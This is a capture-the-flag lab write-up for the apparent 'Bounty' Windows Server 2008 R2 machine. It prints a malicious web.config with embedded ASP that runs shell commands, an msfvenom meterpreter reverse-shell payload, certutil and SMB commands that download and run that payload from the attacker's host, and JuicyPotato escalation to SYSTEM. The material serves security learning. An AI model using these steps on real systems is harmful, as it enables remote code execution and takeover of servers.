# bounty

`nmap` shows us that only port 80 is open, so lets begin enumerating that

![](../../.gitbook/assets/image%20%288%29%20%281%29%20%281%29%20%281%29%20%281%29.png)

shows us that we have an `aspx` files, and a folder which looks like, if we upload some thing it will go there. So lets upload a web.config with some `aspx` code in the end. This just runs a systeminfo command. I've tried with just `systeminfo` first, but it doesn't work but the below `cmd.exe /c systeminfo` worked

```text
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
</appSettings>
</configuration>
<!--
<% Response.write("-"&"->")
Response.write("<pre>")
Set wShell1 = CreateObject("WScript.Shell")
        Set cmd1 = wShell1.Exec("cmd /c systeminfo")
output1 = cmd1.StdOut.Readall()
set cmd1 = nothing: Set wShell1 = nothing
Response.write(output1)
Response.write("</pre><!-"&"-") %>
-->
```

now, I'm going to make use of my default commands for doing file upload/download related things on windows

```text
smbserver.py -u guest -password guest -smb2support kalishare $(pwd)

net use x: \\10.10.14.25\kalishare /user:guest guest
copy x:\shell.exe c:\windows\temp\shell.exe
```

once we've run both these commands on the server using the above tactic. Replace the cmd.exe with the above net use command, and after that we can try to just run the reverse shell command with the payload we generate from msfvenom. the systeminfo command gives us the information about the webserver \(omitted unneeded info\)

```text
Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Domain:                    WORKGROUP
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.93
```

so its a x64 and 2008 R2 server. lets generate the msfvenom payload now,

```text
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=4242 -f exe -o shell.exe
```

we can use either a normal reverse shell or meterpreter shell here. I've used meterpreter since I find it a bit easy to manage and has some useful functionality like file upload etc.

```text
certutil -urlcache -split -f http://10.10.14.9/shell.exe shell.exe
```

this is the part where the payload is uploaded into the box using the code execution we got via the web.config. This should work with doing just a normal smb transfer as well. Once we upload the payload and got a call back on our python3 -m http.server 80, we can be sure that our payload is uploaded into the remote server.

now we can change the payload in our web.config file to just execute the shell we have uploaded.

Once we understand whats going on and how to exploit it, its a matter of bunch of commands to exploit this machine which I've summarised below

```text
# to server our payload files
smbserver.py -u guest -password guest -smb2support kalishare $(pwd)

# use the remote share - this command to be run in the web.config file
net use x: \\10.10.14.9\kalishare /user:guest guest

# in the web.config, run the shell.exe, this gives us reverse shell as merlin
cmd /c x:\\shell.exe

# get juicypotato.exe into our share
# now that we got a shell, run (also listen on 4242)
# we can use the same shell.exe and listen on same port, since the active session
# is not listening anymore on that port
x:\JuicyPotato.exe -t * -p x:\\shell.exe -l 9001

and we get a root shell
```

![](../../.gitbook/assets/image%20%289%29.png)

